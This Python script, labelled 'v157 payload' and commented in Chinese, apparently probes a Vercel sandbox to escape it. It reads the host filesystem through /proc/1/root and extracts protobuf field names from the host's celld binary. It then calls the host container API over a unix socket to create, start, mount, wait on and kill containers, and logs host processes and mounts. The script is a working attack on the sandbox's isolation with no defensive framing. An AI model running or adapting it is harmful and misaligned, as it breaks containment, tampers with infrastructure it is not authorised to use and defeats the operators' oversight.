# -*- coding: utf-8 -*-
"""v157 payload: CreateContainerRequest protobuf 字段提取 + 容器状态验证 + Mount 尝试
输出 /vercel/sandbox/v157c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v157c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_ctx(path, anchors, before=400, after=1800, max_hits=30):
    """找 anchor 位置并输出上下文 (原始 repr)"""
    try:
        data = open(path, 'rb').read()
        hits = 0
        for anc in anchors:
            if hits >= max_hits:
                break
            for m in re.finditer(re.escape(anc), data):
                s = max(0, m.start() - before)
                seg = data[s:m.start() + after]
                log('CTX %s @0x%x: %r' % (anc, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('CTX done hits=%d' % hits)
    except Exception as e:
        log('CTX EXC %s' % e)


# ============ 1: protobuf descriptor 提取 ============
log('=== 1 descriptors ===')
bin_ctx(R + '/opt/vercel/celld',
        [b'CreateContainerRequest', b'StartRequest', b'MountRequest',
         b'KillRequest', b'WaitRequest', b'ExecRequest', b'StdinRequest'],
        before=300, after=1600, max_hits=24)

# ============ 2: 提取所有 protobuf 字段名 (descriptor 区域) ============
log('=== 2 proto fields ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    # 找 containers 服务 descriptor 区域 (0x16e0xxx - 0x16e2xxx 附近)
    idx = data.find(b'vercel/hive/gen/cell/api/containers;containers')
    log('containers desc at 0x%x' % idx)
    if idx > 0:
        region = data[max(0, idx - 6000):idx + 12000]
        # 提取可读字符串 (protobuf 字段名)
        for m in re.finditer(rb'[\x20-\x7e]{6,}', region):
            s = m.group().decode(errors='replace')
            if any(k in s for k in ['request', 'Request', 'response', 'Response',
                                    'container', 'drive', 'workload', 'spec', 'image',
                                    'command', 'process', 'mount', 'network', 'env']):
                log('FIELD %s' % s)
except Exception as e:
    log('fields EXC %s' % e)

# ============ 3: Create + Start + 状态验证 ============
log('=== 3 create+start ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': 'sandbox'}).encode(), t=8)
log('Create -> %s %r' % (st, pay))
cid = None
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
if m:
    cid = m.group(1).decode()
    log('containerId=%s' % cid)
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2))
    # 状态验证
    time.sleep(1)
    # 1) /proc 找新进程
    log('--- procs ---')
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in ('celld', 'containerd', 'sandboxctrl', 'runc', 'init', 'sandbox-init'):
                log('proc %s comm=%s' % (d, comm))
    # 2) /run/cell/runc 目录
    try:
        for e in sorted(os.listdir(R + '/run/cell/runc')):
            log('runc dir %s' % e)
    except Exception as e:
        log('runc EXC %s' % e)
    # 3) mountinfo 找新挂载
    try:
        mi = open('/proc/1/mountinfo').read()
        for ln in mi.splitlines():
            if 'sandbox' in ln or 'drives' in ln or 'vdb' in ln or 'vda' in ln:
                log('MI %s' % ln[:200])
    except Exception as e:
        log('MI EXC %s' % e)

# ============ 4: Mount / Wait / Kill 尝试 ============
log('=== 4 methods ===')
if cid:
    for meth, body in [('Mount', {'container_id': cid}),
                       ('Mount', {'container_id': cid, 'drive_id': 'sandbox'}),
                       ('Wait', {'container_id': cid}),
                       ('Kill', {'container_id': cid})]:
        st2, pay2 = raw_req(CELL, '%s/%s' % (CTRS, meth), json.dumps(body).encode(), t=5)
        log('%s %s -> %s %r' % (meth, body, st2, pay2[:250]))

log('V157_DONE')
f.close()
